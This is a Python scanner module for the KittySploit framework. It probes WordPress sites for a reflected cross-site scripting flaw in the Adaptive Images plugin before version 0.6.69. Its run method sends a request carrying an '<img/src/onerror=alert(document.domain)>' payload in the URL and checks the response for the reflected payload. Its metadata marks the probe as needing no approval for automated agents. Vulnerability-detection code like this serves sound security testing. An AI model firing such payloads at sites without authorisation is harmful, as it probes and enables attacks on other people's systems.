#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Adaptive Images < 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Adaptive Images < 0.6.69 - Cross-Site Scripting Detection',
        'description': 'WordPress Adaptive Images < 0.6.69 is susceptible to cross-site scripting because the plugin does not sanitize and escape the REQUEST_URI before outputting it back in a page.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wpscan', 'wordpress', 'xss', 'wp-plugin', 'wp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/eef137af-408c-481c-8493-afe6ee2105d0',
            'https://plugins.trac.wordpress.org/changeset/2655683',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<img/src/onerror=alert(document.domain)>', '<td>Image</td>',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="WordPress Adaptive Images < 0.6.69 - Cross-Site Scripting detected",
                path='/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true',
            )
            return True
        return False

